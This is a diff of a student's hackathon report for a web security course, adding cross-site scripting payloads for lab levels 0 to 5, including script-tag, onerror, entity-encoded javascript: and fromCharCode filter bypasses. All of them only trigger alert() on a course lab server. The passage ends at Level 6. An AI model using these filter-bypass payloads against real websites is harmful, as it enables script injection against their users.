@@ -20,53 +20,67 @@ Outcomes I learned from this hackathon were...
 
 Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1](https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1).
 
-Optional (+2.5p bonus): Include the link to an online video less than 2 minutes to demonstrate your attacks
-
 ### Task 1: Attacks
 
 #### a. Level 0
 
-**i** injected XSS to display name using alert\()
+`<script>alert("Level 0-Hacked by Sophia Munoz")</script>`
 
-**ii** payload of the attack inspected in the browser
+![Level 0 Injected XSS and Payload Attack](../../images/level-0-attack.png)
+*Level 0 Injected XSS and Payload Attack*
 
 #### b. Level 1
 
-**i** injected XSS to display name using alert\()
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`
 
-**ii** payload of the attack inspected in the browser
+![Level 1 Injected XSS and Payload Attack](../../images/level-1-attack.png)
+*Level 1 Injected XSS and Payload Attack*
 
 #### c. Level 2
 
-Guess the core source code of the `echo.php` web application \(where the vulnerability is exploited)
+Assuming the method used was the `POST` method. The vulnerability is exploited in the `echo.php` web application on this line of code: `echo $_POST['input']`
 
-**i** injected XSS to display name using alert\()
+```html
+var f = document.createElement('form');
+f.method = 'POST';
+f.action = '';
+var i = document.createElement('input');
+i.name = 'input';
+i.value = '<script>alert("Level 2-Hacked by Sophia Munoz")</script>';
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
+```
 
-**ii** payload of the attack inspected in the browser
+![Level 2 Injected XSS and Payload Attack](../../images/level-2-attack.png)
+*Level 2 Injected XSS and Payload Attack*
 
 #### d. Level 3
 
-Guess the core source code of the `echo.php` web application \(where the vulnerability is exploited)
+Assuming the method used was the `GET` method. The vulnerability is exploited in the fact that only `<script>` and `</script>` were filtered out, but other event handlers like the one used to inject in the URL \(`onerror`) weren't handled at all.
 
-**i** injected XSS to display name using alert\()
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=<img src=x onerror="alert('Level 3-Hacked by Sophia Munoz')">`
 
-**ii** payload of the attack inspected in the browser
+![Level 3 Injected XSS and Payload Attack](../../images/level-3-attack.png)
+*Level 3 Injected XSS and Payload Attack*
 
 #### e. Level 4
 
-Guess the core source code of the `echo.php` web application \(where the vulnerability is exploited)
+I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL parameter separator. Assuming the method used was the `GET` method. The vulnerability is exploited by a line like `echo $input`. Even `script` wasn't detected as it wasn't a literal letter-for-letter string.
 
-**i** injected XSS to display name using alert\()
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=<a href="java%26%23115%3Bcript:alert('Level 4-Hacked by Sophia Munoz')">Click Me</a>`
 
-**ii** payload of the attack inspected in the browser
+![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
+*Level 4 Injected XSS and Payload Attack*
 
 #### f. Level 5
 
-Guess the core source code of the `echo.php` web application \(where the vulnerability is exploited)
+I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.
 
-**i** injected XSS to display name using alert\()
+`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,105,97,32,77,117,110,111,122,39,41))>`
 
-**ii** payload of the attack inspected in the browser
+![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
+*Level 4 Injected XSS and Payload Attack*
 
 #### g. Level 6
 
